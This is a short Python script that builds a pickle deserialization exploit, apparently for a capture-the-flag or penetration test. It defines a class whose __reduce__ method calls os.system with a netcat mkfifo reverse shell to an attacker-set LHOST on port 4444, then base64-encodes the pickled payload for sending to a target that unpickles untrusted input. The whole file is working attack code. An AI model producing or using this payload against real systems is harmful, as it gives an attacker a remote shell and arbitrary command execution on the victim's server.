import pickle
from base64 import urlsafe_b64encode
# does include -, may except - instead of + 

LHOST = ""
reverse_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} 4444 >/tmp/f"

unos_pickle_shell = str(urlsafe_b64encode(pickle.dumps(reverse_shell)))
print(unos_pickle_shell)
print(f"{urlsafe_b64encode(pickle.dumps(reverse_shell))}")


class reducer(object):
    def __reduce__(self):
        import os
        return (os.system,(reverse_shell,))

pickle_shell = urlsafe_b64encode(pickle.dumps(reducer()))
print(pickle_shell)
